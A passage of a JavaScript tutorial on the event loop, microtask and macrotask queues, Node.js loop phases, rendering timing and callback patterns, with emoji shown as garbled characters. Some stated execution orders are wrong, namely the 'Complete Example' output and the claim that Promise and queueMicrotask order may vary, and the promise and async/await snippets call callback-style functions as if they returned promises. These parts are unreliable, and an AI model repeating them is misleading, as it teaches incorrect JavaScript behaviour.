console.log('Phase 1: Sync end');

// Output:
// Phase 1: Sync
// Phase 1: Sync end
// Phase 3: Microtask (after macrotask)
// Phase 2: Macrotask
```

### Multiple Macrotasks and Microtasks

```javascript
// âœ… Complete event loop cycle
console.log('1. Start');

setTimeout(() => {
  console.log('2. Macrotask 1');
  
  Promise.resolve()
    .then(() => {
      console.log('3. Microtask created in Macrotask 1');
    });
}, 0);

Promise.resolve()
  .then(() => {
    console.log('4. Microtask 1');
    
    setTimeout(() => {
      console.log('5. Macrotask created in Microtask 1');
    }, 0);
  });

console.log('6. End');

// Output:
// 1. Start
// 6. End
// 4. Microtask 1
// 2. Macrotask 1
// 3. Microtask created in Macrotask 1
// 5. Macrotask created in Microtask 1
```

---

## setTimeout and setInterval Timing

### How setTimeout Works

```javascript
// âœ… setTimeout queues a macrotask
const start = Date.now();

setTimeout(() => {
  console.log(`Executed after ${Date.now() - start}ms`);
}, 100);

// Note: May execute slightly later due to event loop
// Actual delay depends on what's in call stack
```

### setTimeout(0) â‰  Immediate Execution

```javascript
// âœ… setTimeout(0) still queues to task queue
console.log('Start');

setTimeout(() => {
  console.log('setTimeout(0)');
}, 0);

console.log('End');

// Output:
// Start
// End
// setTimeout(0)

// setTimeout(0) is NOT immediate!
// It's queued after current script finishes
```

### Blocking Delays

```javascript
// âœ… Blocking code delays all timers
const start = Date.now();

setTimeout(() => {
  console.log(`Executed after ${Date.now() - start}ms`);
}, 100);

// Block for 200ms
let blocked = false;
while (Date.now() - start < 200) {
  blocked = true;
}

// Output: "Executed after 200ms" (not 100ms!)
// The timer must wait for blocking code to finish
```

### setInterval Behavior

```javascript
// âœ… setInterval queues repeatedly
let count = 0;
const interval = setInterval(() => {
  console.log(`Interval: ${++count}`);
  
  if (count >= 3) {
    clearInterval(interval);
  }
}, 100);

// Each callback is queued as separate macrotask
```

### Nested Timers

```javascript
// âœ… Nested timers have minimum delay
setTimeout(() => {
  console.log('Outer timeout');
  
  setTimeout(() => {
    console.log('Inner timeout');
  }, 0);
}, 0);

// Output: Outer timeout, then Inner timeout
```

---

## queueMicrotask()

### Basic Usage

```javascript
// âœ… Queue a microtask explicitly
console.log('Start');

queueMicrotask(() => {
  console.log('Microtask');
});

console.log('End');

// Output:
// Start
// End
// Microtask
```

### Comparison with Promise.then()

```javascript
// âœ… Both queue microtasks (behave the same)
console.log('Start');

Promise.resolve().then(() => {
  console.log('Promise');
});

queueMicrotask(() => {
  console.log('queueMicrotask');
});

console.log('End');

// Output:
// Start
// End
// Promise (or queueMicrotask, order may vary)
// queueMicrotask (or Promise)
```

### Nested Microtasks

```javascript
// âœ… Microtasks can queue more microtasks
console.log('1');

queueMicrotask(() => {
  console.log('2');
  
  queueMicrotask(() => {
    console.log('3');
  });
});

queueMicrotask(() => {
  console.log('4');
});

console.log('5');

// Output: 1, 5, 2, 4, 3
// All original microtasks before newly queued ones
```

### Use Cases

```javascript
// âœ… Execute code after current event but before rendering
queueMicrotask(() => {
  // Update data
  data.update();
  
  // Will execute before next render
  // Can be used for batch updates
});

// âœ… Create custom async behavior
function promisify(callback) {
  return new Promise((resolve) => {
    queueMicrotask(() => {
      callback();
      resolve();
    });
  });
}

promisify(() => {
  console.log('Executed as microtask');
});
```

---

## Execution Order

### Complete Example

```javascript
console.log('Script start');

// Macrotask
setTimeout(() => {
  console.log('setTimeout 1');
}, 0);

// Microtask via Promise
Promise.resolve()
  .then(() => {
    console.log('Promise 1');
    
    // Microtask inside microtask
    queueMicrotask(() => {
      console.log('queueMicrotask inside Promise');
    });
  })
  .then(() => {
    console.log('Promise 2');
  });

// Microtask
queueMicrotask(() => {
  console.log('queueMicrotask 1');
  
  // Macrotask inside microtask
  setTimeout(() => {
    console.log('setTimeout inside queueMicrotask');
  }, 0);
});

// Macrotask
setTimeout(() => {
  console.log('setTimeout 2');
}, 0);

console.log('Script end');

// Output order:
// Script start
// Script end
// Promise 1
// queueMicrotask 1
// Promise 2
// queueMicrotask inside Promise
// setTimeout 1
// setTimeout 2
// setTimeout inside queueMicrotask
```

### Execution Timeline

```
1. Synchronous code executes
   â””â”€ Console: "Script start"
   â””â”€ Console: "Script end"

2. Microtask queue empties
   â””â”€ Promise 1 executes
   â””â”€ queueMicrotask 1 executes
   â””â”€ Promise 2 executes
   â””â”€ queueMicrotask inside Promise executes

3. First macrotask executes
   â””â”€ setTimeout 1 executes

4. Microtask queue empty, next macrotask executes
   â””â”€ setTimeout 2 executes

5. Microtask queue empty, next macrotask executes
   â””â”€ setTimeout inside queueMicrotask executes
```

---

## Visual Mental Models

### Model 1: Stack and Queues

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚      CALL STACK             â”‚  â† Executes sync code
â”‚  (LIFO - Last In First Out) â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
           â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  MICROTASK QUEUE            â”‚  â† Promises, queueMicrotask
â”‚  (FIFO - First In First Out)â”‚  Executes BEFORE macrotasks
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
           â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  MACROTASK QUEUE            â”‚  â† setTimeout, setInterval
â”‚  (FIFO - First In First Out)â”‚  Executes after microtasks
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### Model 2: Event Loop Cycle

```
START EVENT LOOP CYCLE
â”‚
â”œâ”€ 1. Execute all sync code (Call Stack)
â”‚
â”œâ”€ 2. Microtask queue empty?
â”‚     NO â†’ Execute ONE microtask
â”‚     Loop back to step 2
â”‚
â”œâ”€ 3. Microtask queue empty?
â”‚     YES â†’ Proceed
â”‚
â”œâ”€ 4. Render UI (if needed)
â”‚
â”œâ”€ 5. Execute ONE macrotask
â”‚
â”œâ”€ 6. Loop to step 2
â”‚
â””â”€ Repeat until all queues empty
```

### Model 3: Priority Levels

```
Level 1 (Highest): Synchronous code
                   â†“
Level 2:           Microtasks (Promises, queueMicrotask)
                   â†“
Level 3:           Macrotasks (setTimeout, setInterval)
                   â†“
Level 4 (Lowest):  UI Rendering (requestAnimationFrame)
```

---

## Common Pitfalls

### Pitfall 1: Confusing setTimeout(0)

```javascript
// âŒ WRONG: Assuming setTimeout(0) runs immediately
console.log('1');

setTimeout(() => {
  console.log('2');  // Does NOT run after console.log('1')
}, 0);

console.log('3');

// Output: 1, 3, 2 (NOT: 1, 2, 3)
```

### Pitfall 2: Promise Timing

```javascript
// âŒ WRONG: Thinking Promise is slower than setTimeout
console.log('1');

setTimeout(() => {
  console.log('2');
}, 0);

Promise.resolve().then(() => {
  console.log('3');
});

console.log('4');

// Output: 1, 4, 3, 2
// Promise runs BEFORE setTimeout!
```

### Pitfall 3: Forgetting Microtasks

```javascript
// âŒ WRONG: Not accounting for microtasks
console.log('1');

setTimeout(() => {
  console.log('2');
}, 10);

Promise.resolve()
  .then(() => {
    console.log('3');
  })
  .then(() => {
    console.log('4');
  });

console.log('5');

// Output: 1, 5, 3, 4, 2
// Promises complete before timer!
```

### Pitfall 4: Race Conditions

```javascript
// âŒ WRONG: Race condition with event loop
let result = null;

Promise.resolve().then(() => {
  result = 'async';
});

console.log(result);  // null (not 'async'!)
// Promise hasn't executed yet

setTimeout(() => {
  console.log(result);  // 'async' (now it's ready)
}, 0);
```

---

## Node.js Event Loop Phases (Deep Dive)

The Node.js event loop is more complex than the browser's, with **6 distinct phases**:

### The Six Phases

```
   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”Œâ”€â–ºâ”‚         timers            â”‚  â† setTimeout, setInterval callbacks
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  â”‚     pending callbacks     â”‚  â† I/O callbacks deferred from previous loop
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  â”‚       idle, prepare       â”‚  â† Internal use only
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  â”‚           poll            â”‚  â† Retrieve new I/O events; execute I/O callbacks
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  â”‚          check            â”‚  â† setImmediate callbacks
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â””â”€â”€â”¤      close callbacks      â”‚  â† socket.on('close'), etc.
   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### Phase Details

```javascript
// âœ… Phase 1: TIMERS
// Executes callbacks scheduled by setTimeout() and setInterval()
setTimeout(() => console.log('Timer phase'), 0);

// âœ… Phase 2: PENDING CALLBACKS
// Executes I/O callbacks deferred to the next loop iteration
// (system operations like TCP errors)

// âœ… Phase 3: IDLE, PREPARE
// Internal to Node.js - you can't interact with this phase

// âœ… Phase 4: POLL
// Retrieves new I/O events and executes their callbacks
// Most I/O work happens here (file reads, network requests)
const fs = require('fs');
fs.readFile('file.txt', (err, data) => {
  console.log('Poll phase - file read complete');
});

// âœ… Phase 5: CHECK
// setImmediate() callbacks execute here
setImmediate(() => console.log('Check phase'));

// âœ… Phase 6: CLOSE CALLBACKS
// Close event callbacks (socket.on('close'))
```

### setImmediate vs setTimeout(0)

```javascript
// âš ï¸ Order is NOT guaranteed in main module
setTimeout(() => console.log('timeout'), 0);
setImmediate(() => console.log('immediate'));

// Could output: timeout, immediate
// OR:           immediate, timeout
// (depends on system performance/timing)

// âœ… Inside I/O callback, setImmediate ALWAYS runs first
const fs = require('fs');
fs.readFile(__filename, () => {
  setTimeout(() => console.log('timeout'), 0);
  setImmediate(() => console.log('immediate'));
});

// ALWAYS outputs:
// immediate
// timeout
// (because we're in poll phase, check phase comes next)
```

### process.nextTick vs setImmediate

```javascript
// âœ… process.nextTick runs BEFORE any event loop phase
// âœ… setImmediate runs in the check phase

console.log('1. Sync');

setImmediate(() => console.log('2. setImmediate'));

process.nextTick(() => console.log('3. process.nextTick'));

Promise.resolve().then(() => console.log('4. Promise'));

console.log('5. Sync end');

// Output:
// 1. Sync
// 5. Sync end
// 3. process.nextTick   â† runs before promises!
// 4. Promise
// 2. setImmediate
```

### Node.js Microtask Priority

```javascript
// Node.js has TWO microtask queues:
// 1. process.nextTick queue (higher priority)
// 2. Promise queue (lower priority)

Promise.resolve().then(() => console.log('1. Promise 1'));
process.nextTick(() => console.log('2. nextTick 1'));
Promise.resolve().then(() => console.log('3. Promise 2'));
process.nextTick(() => console.log('4. nextTick 2'));

// Output:
// 2. nextTick 1
// 4. nextTick 2
// 1. Promise 1
// 3. Promise 2

// ALL nextTicks run before ANY Promises!
```

### Danger: nextTick Starvation

```javascript
// âŒ DANGER: Recursive nextTick blocks the event loop
function recursiveNextTick() {
  process.nextTick(recursiveNextTick);
}
// recursiveNextTick();  // This would starve I/O!

// âœ… Use setImmediate for recursive async work
function recursiveImmediate() {
  setImmediate(recursiveImmediate);
}
// This allows I/O to process between iterations
```

---

## queueMicrotask vs Promise.then

### The Difference

```javascript
// Both create microtasks, but Promise.then has more overhead

// âœ… queueMicrotask: Direct microtask scheduling
queueMicrotask(() => {
  console.log('Direct microtask');
});

// âœ… Promise.then: Creates a Promise, THEN schedules microtask
Promise.resolve().then(() => {
  console.log('Promise microtask');
});
```

### When to Use Each

```javascript
// âœ… Use queueMicrotask for:
// - Pure scheduling needs (no Promise chain)
// - Performance-critical microtask scheduling
// - Custom async primitives

queueMicrotask(() => {
  // Clean up after sync code completes
  cleanup();
});

// âœ… Use Promise.then for:
// - Async operations returning values
// - Error handling with .catch()
// - Chaining async operations

Promise.resolve(data)
  .then(process)
  .then(transform)
  .catch(handleError);
```

### Performance Comparison

```javascript
// Benchmark: 100,000 microtasks

console.time('queueMicrotask');
for (let i = 0; i < 100000; i++) {
  queueMicrotask(() => {});
}
Promise.resolve().then(() => {
  console.timeEnd('queueMicrotask');  // ~15ms
});

console.time('Promise.then');
for (let i = 0; i < 100000; i++) {
  Promise.resolve().then(() => {});
}
Promise.resolve().then(() => {
  console.timeEnd('Promise.then');    // ~25ms (slower)
});
```

### Error Handling Difference

```javascript
// âŒ queueMicrotask: Errors throw globally
queueMicrotask(() => {
  throw new Error('Uncaught!');
});
// This becomes an unhandled error

// âœ… Promise: Errors are catchable
Promise.resolve()
  .then(() => {
    throw new Error('Caught!');
  })
  .catch(err => {
    console.log('Handled:', err.message);
  });
```

---

## Browser Render Pipeline

### Event Loop and Rendering

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  One Frame (~16.67ms at 60fps)                          â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                         â”‚
â”‚  1. Run one macrotask (or none)                         â”‚
â”‚  2. Run ALL microtasks                                  â”‚
â”‚  3. If it's time to render:                             â”‚
â”‚     a. Run requestAnimationFrame callbacks              â”‚
â”‚     b. Run IntersectionObserver callbacks               â”‚
â”‚     c. Calculate styles                                 â”‚
â”‚     d. Layout (reflow)                                  â”‚
â”‚     e. Paint                                            â”‚
â”‚     f. Composite                                        â”‚
â”‚  4. If idle time remains:                               â”‚
â”‚     - Run requestIdleCallback tasks                     â”‚
â”‚                                                         â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### requestAnimationFrame Timing

```javascript
// âœ… requestAnimationFrame runs BEFORE paint
console.log('1. Sync');

setTimeout(() => console.log('2. setTimeout'), 0);

requestAnimationFrame(() => {
  console.log('3. rAF - before paint');
});

Promise.resolve().then(() => console.log('4. Promise'));

// Typical output:
// 1. Sync
// 4. Promise
// 3. rAF - before paint  â† runs when browser is ready to paint
// 2. setTimeout
```

### Avoiding Layout Thrashing

```javascript
// âŒ BAD: Forced synchronous layout (layout thrashing)
const elements = document.querySelectorAll('.item');
elements.forEach(el => {
  const height = el.offsetHeight;  // FORCES layout read
  el.style.height = height * 2 + 'px';  // Triggers layout
  // Next iteration reads, forces another layout...
});

// âœ… GOOD: Batch reads, then batch writes
const elements = document.querySelectorAll('.item');

// Phase 1: Read all values
const heights = Array.from(elements).map(el => el.offsetHeight);

// Phase 2: Write all values
elements.forEach((el, i) => {
  el.style.height = heights[i] * 2 + 'px';
});
```

### requestIdleCallback for Non-Critical Work

```javascript
// âœ… requestIdleCallback runs during browser idle time
function processBackgroundTasks(deadline) {
  // deadline.timeRemaining() tells us how much time we have
  while (deadline.timeRemaining() > 0 && tasks.length > 0) {
    const task = tasks.shift();
    task();
  }
  
  // If more tasks remain, schedule another idle callback
  if (tasks.length > 0) {
    requestIdleCallback(processBackgroundTasks);
  }
}

// Start background processing
requestIdleCallback(processBackgroundTasks);
```

### Animation Frame vs setTimeout for Animation

```javascript
// âŒ BAD: setTimeout-based animation (janky)
function animateWithTimeout(element, targetX) {
  let currentX = 0;
  function step() {
    currentX += 5;
    element.style.transform = `translateX(${currentX}px)`;
    if (currentX < targetX) {
      setTimeout(step, 16);  // Not synced to display
    }
  }
  step();
}

// âœ… GOOD: requestAnimationFrame animation (smooth)
function animateWithRAF(element, targetX) {
  let currentX = 0;
  function step() {
    currentX += 5;
    element.style.transform = `translateX(${currentX}px)`;
    if (currentX < targetX) {
      requestAnimationFrame(step);  // Synced to display refresh
    }
  }
  requestAnimationFrame(step);
}
```

---

## Summary

### Key Concepts

| Concept | Details |
|---------|---------|
| **Call Stack** | Executes synchronous code (LIFO) |
| **Microtask Queue** | Promises, queueMicrotask (high priority) |
| **Macrotask Queue** | setTimeout, setInterval (lower priority) |
| **Event Loop** | Coordinates execution between queues |
| **Priority** | Sync â†’ Microtasks â†’ Macrotasks â†’ Rendering |

### Execution Rules

1. **Execute all synchronous code first**
2. **Then execute ALL microtasks**
3. **Then execute ONE macrotask**
4. **Then execute ALL newly queued microtasks**
5. **Repeat from step 3**

### Quick Reference

```javascript
// âœ… Execution order
console.log('1');                    // Sync: 1

setTimeout(() => {
  console.log('2');                  // Macrotask: 2
}, 0);

Promise.resolve().then(() => {
  console.log('3');                  // Microtask: 3
});

console.log('4');                    // Sync: 4

// Output: 1, 4, 3, 2
```

### Next Steps

- Understand callbacks and their limitations
- Learn how Promises handle the event loop
- Master async/await patterns
- Apply async patterns to real-world scenarios
## Callbacks 



## Callback Pattern

### Basic Callback Pattern

```javascript
// âœ… Standard callback for async operations
function fetchData(url, callback) {
  // Simulate async operation
  setTimeout(() => {
    const data = { id: 1, name: 'User' };
    callback(data);
  }, 100);
}

fetchData('https://api.example.com/user', (data) => {
  console.log('Data received:', data);
});

// Output: Data received: { id: 1, name: 'User' }
```

### Callback with Multiple Parameters

```javascript
// âœ… Callback receiving multiple values
function calculateAsync(a, b, callback) {
  setTimeout(() => {
    const result = a + b;
    callback(result);
  }, 100);
}

calculateAsync(5, 3, (result) => {
  console.log(`Result: ${result}`);
});

// Output: Result: 8
```

### Array Methods with Callbacks

```javascript
// âœ… Array.forEach uses callbacks
const numbers = [1, 2, 3, 4, 5];

numbers.forEach((num) => {
  console.log(num * 2);
});

// âœ… Array.map uses callbacks
const doubled = numbers.map((num) => num * 2);
console.log(doubled);  // [2, 4, 6, 8, 10]

// âœ… Array.filter uses callbacks
const evens = numbers.filter((num) => num % 2 === 0);
console.log(evens);  // [2, 4]

// âœ… Array.reduce uses callbacks
const sum = numbers.reduce((acc, num) => acc + num, 0);
console.log(sum);  // 15
```

### Event Listeners with Callbacks

```javascript
// âœ… Event listeners are callbacks
const button = document.querySelector('button');

button.addEventListener('click', () => {
  console.log('Button clicked!');
});

// âœ… Remove event listener
function handleClick() {
  console.log('Clicked!');
}

button.addEventListener('click', handleClick);
button.removeEventListener('click', handleClick);
```

---

## Error-First Callbacks

### The Error-First Convention

The **error-first callback** (Node.js convention) takes error as the first parameter:

```javascript
// âœ… Error-first callback pattern
function readFile(filename, callback) {
  // Simulated file reading
  setTimeout(() => {
    if (filename === 'nonexistent.txt') {
      // First argument: error
      callback(new Error('File not found'));
    } else {
      // First argument: null (no error)
      // Second argument: data
      callback(null, 'File contents');
    }
  }, 100);
}

readFile('document.txt', (error, data) => {
  if (error) {
    console.error('Error:', error.message);
  } else {
    console.log('Data:', data);
  }
});

// Using with nonexistent file
readFile('nonexistent.txt', (error, data) => {
  if (error) {
    console.error('Error:', error.message);  // Error: File not found
  }
});
```

### Multiple Callbacks for Different States

```javascript
// âœ… Success and error callbacks
function fetchUserData(userId, onSuccess, onError) {
  setTimeout(() => {
    if (userId > 0) {
      onSuccess({ id: userId, name: 'User' });
    } else {
      onError('Invalid user ID');
    }
  }, 100);
}

fetchUserData(
  1,
  (data) => {
    console.log('Success:', data);
  },
  (error) => {
    console.error('Error:', error);
  }
);
```

### Callback with Finally

```javascript
// âœ… Success, error, and finally callbacks
function performOperation(callback) {
  let loading = true;
  
  const onSuccess = (data) => {
    console.log('Success:', data);
    callback();
  };
  
  const onError = (error) => {
    console.error('Error:', error);
    callback();
  };
  
  // Do something
  setTimeout(() => {
    if (Math.random() > 0.5) {
      onSuccess({ result: 42 });
    } else {
      onError('Operation failed');
    }
  }, 100);
}

performOperation(() => {
  console.log('Operation complete');
});
```

---

## Callback Hell

### What is Callback Hell?

**Callback hell** (or "pyramid of doom") occurs when multiple nested callbacks make code hard to read and maintain.

```javascript
// âŒ Callback hell example
function getData(callback) {
  setTimeout(() => {
    callback({ userId: 1 });
  }, 100);
}

function getUser(userId, callback) {
  setTimeout(() => {
    callback({ id: userId, name: 'John' });
  }, 100);
}

function getPosts(userId, callback) {
  setTimeout(() => {
    callback([{ id: 1, title: 'Post 1' }, { id: 2, title: 'Post 2' }]);
  }, 100);
}

function getComments(postId, callback) {
  setTimeout(() => {
    callback([{ id: 1, text: 'Comment 1' }]);
  }, 100);
}

// Callback hell!
getData((data) => {
  getUser(data.userId, (user) => {
    getPosts(user.id, (posts) => {
      getComments(posts[0].id, (comments) => {
        console.log('Finally got comments:', comments);
      });
    });
  });
});
```

### Problems with Callback Hell

1. **Difficult to read** - Code flows right, not down
2. **Hard to maintain** - Changes require deep nesting edits
3. **Error handling is complex** - Need try-catch at each level
4. **Testing is harder** - Hard to isolate functionality

### Solutions to Callback Hell

**Solution 1: Named Functions**

```javascript
// âœ… Using named functions instead of nested callbacks
function handleData(data) {
  getUser(data.userId, handleUser);
}

function handleUser(user) {
  getPosts(user.id, handlePosts);
}

function handlePosts(posts) {
  getComments(posts[0].id, handleComments);
}

function handleComments(comments) {
  console.log('Finally got comments:', comments);
}

getData(handleData);
```

**Solution 2: Promises**

```javascript
// âœ… Using Promises (chain with .then())
getData()
  .then((data) => getUser(data.userId))
  .then((user) => getPosts(user.id))
  .then((posts) => getComments(posts[0].id))
  .then((comments) => {
    console.log('Finally got comments:', comments);
  })
  .catch((error) => {
    console.error('Error:', error);
  });
```

**Solution 3: Async/Await**

```javascript
// âœ… Using async/await (looks like sync code)
async function fetchComments() {
  try {
    const data = await getData();
    const user = await getUser(data.userId);
    const posts = await getPosts(user.id);
    const comments = await getComments(posts[0].id);
    console.log('Finally got comments:', comments);
  } catch (error) {
    console.error('Error:', error);
  }
}

fetchComments();
```

---

## Inversion of Control

### What is Inversion of Control?

**Inversion of Control (IoC)** means you lose control of when and how your callback is executed. You must trust the library/function to call it correctly.

```javascript
// âŒ Loss of control
function saveUserData(user, callback) {
  // You pass your callback but don't control:
  // - When it's called
  // - How many times it's called
  // - With what arguments
  // - In what context (this value)
  
  setTimeout(() => {
    callback(user);  // Hope they call it right!
  }, 100);
}

saveUserData({ name: 'John' }, (result) => {
  console.log('Saved:', result);
});
```

### Risks of IoC with Callbacks

```javascript
// âŒ Risk 1: Callback called multiple times
function buggyOperation(callback) {
  callback('first');
  callback('second');  // Called twice!
  callback('third');   // Called three times!
}

buggyOperation((result) => {
  console.log('Result:', result);  // Logs three times
});

// âŒ Risk 2: Callback never called
function forgotCallback(callback) {
  setTimeout(() => {
    // Oops, forgot to call callback!
    console.log('Operation complete');
  }, 100);
}

forgotCallback((result) => {
  console.log('Never executes');
});

// âŒ Risk 3: Callback called with wrong arguments
function wrongArguments(callback) {
  callback({ id: 1, wrong: 'data' });
}

wrongArguments((expectedData) => {
  // expectedData is not what we expected
  console.log(expectedData.name);  // undefined
});

// âŒ Risk 4: Callback called with wrong context
function wrongContext(callback) {
  callback.call({ wrongThis: true });
}

wrongContext(function() {
  // this might not be what we expected
  console.log(this);  // { wrongThis: true }
});
```

### IoC Solutions with Promises

```javascript
// âœ… Promises solve IoC problems
const promise = new Promise((resolve, reject) => {
  // - Can only be called once
  // - Either resolve() or reject()
  // - Cannot be called with wrong context
  
  resolve('success');
  
  // These have no effect (already settled)
  resolve('ignored');
  reject('ignored');
});

promise
  .then((result) => {
    console.log('Called exactly once:', result);
  })
  .catch((error) => {
    // Won't execute (promise resolved)
  });
```

---

## Advanced Callback Patterns

### Continuation-Passing Style (CPS)

```javascript
// âœ… Continuation-passing style
function add(a, b, continuation) {
  // Continue with the result
  continuation(a + b);
}

function multiply(a, b, continuation) {
  continuation(a * b);
}

// Chaining operations
add(2, 3, (result1) => {
  console.log('Add result:', result1);
  
  multiply(result1, 2, (result2) => {
    console.log('Multiply result:', result2);
  });
});
```

### Transforming Callbacks to Promises (Promisification)

```javascript
// âŒ Callback-based function
function readFileCallback(filename, callback) {
  setTimeout(() => {
    callback(null, `Contents of ${filename}`);
  }, 100);
}

// âœ… Convert to Promise
function readFilePromise(filename) {
  return new Promise((resolve, reject) => {
    readFileCallback(filename, (error, data) => {
      if (error) {
        reject(error);
      } else {
        resolve(data);
      }
    });
  });
}

// Now usable with async/await
async function readFiles() {
  const data1 = await readFilePromise('file1.txt');
  const data2 = await readFilePromise('file2.txt');
  console.log(data1, data2);
}

readFiles();
```

### Callback Composition

```javascript
// âœ… Compose multiple callbacks
function compose(...fns) {
  return (value, callback) => {
    let index = 0;
    
    const next = (err, result) => {
      if (err) return callback(err);
      if (index >= fns.length) return callback(null, result);
      
      fns[index++](result, next);
    };
    
    next(null, value);
  };
}

function step1(value, next) {
  console.log('Step 1:', value);
  next(null, value * 2);
}

function step2(value, next) {
  console.log('Step 2:', value);
  next(null, value + 10);
}

function step3(value, next) {
  console.log('Step 3:', value);
  next(null, value * 3);
}

const pipeline = compose(step1, step2, step3);

pipeline(5, (error, result) => {
  console.log('Final result:', result);  // ((5 * 2) + 10) * 3 = 60
});
```

---

## Best Practices

### âœ… DO

```javascript
// âœ… Use error-first callbacks
function operation(callback) {
  setTimeout(() => {
    const success = true;
    if (success) {
      callback(null, { data: 'success' });
    } else {
      callback(new Error('Failed'));
    }
  }, 100);
}

operation((error, result) => {
  if (error) {
    console.error('Error:', error);
  } else {
    console.log('Success:', result);
  }
});

// âœ… Document callback expectations
/**
 * Fetches user data
 * @param {number} userId - The user ID
 * @param {Function} callback - Called with (error, user)
 */
function getUser(userId, callback) {
  // Implementation
}

// âœ… Validate callbacks
function executeCallback(callback) {
  if (typeof callback !== 'function') {
    throw new TypeError('Callback must be a function');
  }
  callback();
}

// âœ… Consider using Promises for new code
function newFeature(input) {
  return new Promise((resolve, reject) => {
    if (input) {
      resolve({ data: 'success' });
    } else {
      reject(new Error('Invalid input'));
    }
  });
}
```

### âŒ DON'T

```javascript
// âŒ Don't nest callbacks unnecessarily
operation1((result1) => {
  operation2((result2) => {
    operation3((result3) => {
      console.log(result3);
    });
  });
});

// âŒ Don't forget error handling
function buggyOperation(callback) {
  callback(null, someUndefinedVariable);  // Will error
}

// âŒ Don't call callback multiple times (if you only meant to call once)
function buggy(callback) {
  callback('first');
  callback('second');  // Unexpected
}

// âŒ Don't assume callback will be called
function forgetful(callback) {
  // Forgot to call callback!
  console.log('Done');
}

// âŒ Don't use callbacks for synchronous operations
function sync(callback) {
  const result = 2 + 2;
  callback(result);  // Unnecessary
}

sync((result) => {
  console.log(result);
});
```

---

## Summary

### Callback Key Points

| Concept | Details |
|---------|---------|
| **Definition** | Function passed as argument to another function |
| **Synchronous** | Executes immediately |
| **Asynchronous** | Executes later |
| **Error-first** | Error as first parameter (Node.js convention) |
| **Hell** | Multiple nested callbacks (pyramid of doom) |
| **IoC Problem** | Loss of control over callback execution |
| **Solutions** | Promises, async/await, named functions |

### When to Use Callbacks

âœ… **Still useful for:**
- Event listeners (DOM, EventEmitter)
- Array methods (map, filter, reduce, forEach)
- Simple async operations
- Legacy codebases

âŒ **Avoid for:**
- Complex async flows
- Multiple sequential operations
- New code (use Promises/async-await)

### Callback vs Promises vs Async/Await

```javascript
// Callbacks
